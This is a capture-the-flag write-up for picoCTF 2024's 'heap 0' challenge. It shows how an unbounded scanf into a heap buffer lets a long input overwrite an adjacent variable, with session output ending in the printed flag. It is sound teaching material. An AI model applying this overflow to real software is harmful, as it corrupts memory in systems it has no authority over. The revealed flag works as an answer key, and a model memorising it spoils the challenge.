# heap 0 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2024, heap overflow 

## Description ##

Are overflows just a stack concern?

## Approach ##

I am provided a binary file, `chall`, and a c file, `chall.c`. Inspecting the c file, I can see that `check_win` function prints the flag if `safe_var` does not equal "bico", `print_menu` prints the menu (As the name suggests), `init` function sets up the variables, `write_buffer` allows you to write data on the heap, and `print_heap` prints the address of `safe_var` and `input_data`. `main` calls on any function mentioned above depending on the user input. Seeing how `write_buffer` function allows me to write in the heap and it doesn't check for boundary: 

    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);

I could type a bunch of "aaa...a" to overwrite the adjacent safe_var allocation. Since the if condition just checking if "bico" is changed in anyway. I just spam supply a long string of characters, after that I checked the heap and print the flag:

    Welcome to heap0!
    I put my data on the heap so it should be safe from any tampering.
    Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

    Heap State:
    +-------------+----------------+
    [*] Address   ->   Heap Data
    +-------------+----------------+
    [*]   0x56e3fafa72b0  ->   pico
    +-------------+----------------+
    [*]   0x56e3fafa72d0  ->   bico
    +-------------+----------------+

    1. Print Heap:          (print the current state of the heap)
    2. Write to buffer:     (write to your own personal block of data on the heap)
    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:          (Try to print the flag, good luck)
    5. Exit

    Enter your choice: 2
    Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

    1. Print Heap:          (print the current state of the heap)
    2. Write to buffer:     (write to your own personal block of data on the heap)
    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:          (Try to print the flag, good luck)
    5. Exit

    Enter your choice: 1
    Heap State:
    +-------------+----------------+
    [*] Address   ->   Heap Data
    +-------------+----------------+
    [*]   0x56e3fafa72b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    +-------------+----------------+
    [*]   0x56e3fafa72d0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    +-------------+----------------+

    1. Print Heap:          (print the current state of the heap)
    2. Write to buffer:     (write to your own personal block of data on the heap)
    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:          (Try to print the flag, good luck)
    5. Exit

    Enter your choice: 4

    YOU WIN
    picoCTF{my_first_heap_overflow_c3935a08}

Flag: picoCTF{my_first_heap_overflow_c3935a08}

## Reflection ## 
This challenge is a straightforward introduction to heap-based buffer overflows. It shows that heap memory is not inherently safer than stack memory, and that failing to enforce bounds on heap buffers can allow attackers to overwrite adjacent data and alter program behavior.
